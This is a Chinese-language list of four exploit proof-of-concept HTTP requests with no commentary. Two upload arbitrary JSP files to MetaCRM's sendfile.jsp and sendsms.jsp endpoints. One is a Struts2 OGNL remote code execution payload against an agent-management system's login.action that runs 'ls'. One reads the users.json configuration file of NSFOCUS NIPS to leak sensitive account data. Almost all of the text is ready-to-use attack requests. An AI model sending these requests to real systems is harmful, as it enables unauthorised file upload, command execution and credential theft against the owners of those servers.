1. MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22

------WebKitFormBoundary03rNBzFMIytvpW22
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary03rNBzFMIytvpW22--

2. MetaCRM 客户关系管理系统 sendsms.jsp 任意文件上传漏洞
POST /business/common/sms/sendsms.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22

------WebKitFormBoundary03rNBzFMIytvpW22
Content-Disposition: form-data; name="file"; filename="1.jsp"

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary03rNBzFMIytvpW22--

3. AgentSyste代理商管理系统 login.action Struts2 远程代码执行漏洞
POST /login.action HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
Content-Type: application/x-www-form-urlencoded

debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22ls%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()

4. NIPS 绿盟网络入侵防护系统users.json敏感信息泄漏
GET /api/config/users.json HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
